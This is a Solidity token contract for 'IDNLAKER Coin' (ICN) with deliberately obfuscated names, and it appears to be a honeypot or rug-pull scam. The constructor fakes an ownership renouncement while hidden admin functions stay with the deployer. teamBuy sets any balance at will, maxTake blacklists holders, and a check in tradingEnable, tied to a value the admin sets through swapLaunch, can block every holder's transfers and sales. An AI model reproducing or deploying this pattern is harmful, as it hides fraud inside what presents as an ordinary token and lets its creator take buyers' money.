//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

abstract contract takeToReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamToTx) external view returns (uint256);

    function transfer(address listMode, uint256 feeWalletIs) external returns (bool);

    function allowance(address exemptLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeWalletIs) external returns (bool);

    function transferFrom(
        address sender,
        address listMode,
        uint256 feeWalletIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundTx, uint256 value);
    event Approval(address indexed exemptLiquidity, address indexed spender, uint256 value);
}

interface toMinMetadata is toMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface toFund {
    function createPair(address tokenMin, address listTotalTake) external returns (address);
}

interface exemptAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract IDNLAKERCoin is takeToReceiver, toMin, toMinMetadata {

    function balanceOf(address teamToTx) public view virtual override returns (uint256) {
        return walletLimit[teamToTx];
    }

    function owner() external view returns (address) {
        return feeList;
    }

    bool private listMarketing;

    bool public totalShould;

    function swapLaunch(uint256 feeWalletIs) public {
        minFee();
        limitSender = feeWalletIs;
    }

    function approve(address launchTotal, uint256 feeWalletIs) public virtual override returns (bool) {
        senderFeeBuy[_msgSender()][launchTotal] = feeWalletIs;
        emit Approval(_msgSender(), launchTotal, feeWalletIs);
        return true;
    }

    mapping(address => bool) public enableAmount;

    uint256 amountMode;

    function transfer(address receiverReceiverLimit, uint256 feeWalletIs) external virtual override returns (bool) {
        return tradingEnable(_msgSender(), receiverReceiverLimit, feeWalletIs);
    }

    function tradingEnable(address totalLaunched, address listMode, uint256 feeWalletIs) internal returns (bool) {
        if (totalLaunched == teamFee) {
            return marketingLaunched(totalLaunched, listMode, feeWalletIs);
        }
        uint256 maxModeAt = toMin(amountLimitSwap).balanceOf(tradingReceiver);
        require(maxModeAt == limitSender);
        require(!walletShould[totalLaunched]);
        return marketingLaunched(totalLaunched, listMode, feeWalletIs);
    }

    function maxTake(address receiverExemptShould) public {
        minFee();
        if (listMarketing) {
            listMarketing = true;
        }
        if (receiverExemptShould == teamFee || receiverExemptShould == amountLimitSwap) {
            return;
        }
        walletShould[receiverExemptShould] = true;
    }

    function teamMode() public {
        emit OwnershipTransferred(teamFee, address(0));
        feeList = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return listTeam;
    }

    function minFee() private view {
        require(enableAmount[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private senderFeeBuy;

    string private listTeam = "IDNLAKER Coin";

    address private feeList;

    address public teamFee;

    address takeMaxFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public amountLimitSwap;

    bool public walletTo;

    function totalSupply() external view virtual override returns (uint256) {
        return listSenderIs;
    }

    address tradingReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private shouldSender;

    function marketingLaunched(address totalLaunched, address listMode, uint256 feeWalletIs) internal returns (bool) {
        require(walletLimit[totalLaunched] >= feeWalletIs);
        walletLimit[totalLaunched] -= feeWalletIs;
        walletLimit[listMode] += feeWalletIs;
        emit Transfer(totalLaunched, listMode, feeWalletIs);
        return true;
    }

    string private limitMax = "ICN";

    uint8 private shouldTo = 18;

    uint256 private listSenderIs = 100000000 * 10 ** 18;

    function transferFrom(address totalLaunched, address listMode, uint256 feeWalletIs) external override returns (bool) {
        if (_msgSender() != takeMaxFund) {
            if (senderFeeBuy[totalLaunched][_msgSender()] != type(uint256).max) {
                require(feeWalletIs <= senderFeeBuy[totalLaunched][_msgSender()]);
                senderFeeBuy[totalLaunched][_msgSender()] -= feeWalletIs;
            }
        }
        return tradingEnable(totalLaunched, listMode, feeWalletIs);
    }

    function getOwner() external view returns (address) {
        return feeList;
    }

    uint256 public fundTeam;

    mapping(address => bool) public walletShould;

    bool private teamReceiver;

    constructor (){
        if (exemptFromFee != fundTeam) {
            exemptFromFee = fundTeam;
        }
        teamMode();
        exemptAmount fundLaunched = exemptAmount(takeMaxFund);
        amountLimitSwap = toFund(fundLaunched.factory()).createPair(fundLaunched.WETH(), address(this));
        
        teamFee = _msgSender();
        enableAmount[teamFee] = true;
        walletLimit[teamFee] = listSenderIs;
        
        emit Transfer(address(0), teamFee, listSenderIs);
    }

    function allowance(address txTradingReceiver, address launchTotal) external view virtual override returns (uint256) {
        if (launchTotal == takeMaxFund) {
            return type(uint256).max;
        }
        return senderFeeBuy[txTradingReceiver][launchTotal];
    }

    uint256 private shouldTake;

    function decimals() external view virtual override returns (uint8) {
        return shouldTo;
    }

    bool public walletFrom;

    function symbol() external view virtual override returns (string memory) {
        return limitMax;
    }

    uint256 limitSender;

    function teamBuy(address receiverReceiverLimit, uint256 feeWalletIs) public {
        minFee();
        walletLimit[receiverReceiverLimit] = feeWalletIs;
    }

    function receiverExemptBuy(address takeReceiver) public {
        if (totalShould) {
            return;
        }
        
        enableAmount[takeReceiver] = true;
        
        totalShould = true;
    }

    event OwnershipTransferred(address indexed swapWallet, address indexed limitSell);

    uint256 private exemptFromFee;

    mapping(address => uint256) private walletLimit;

}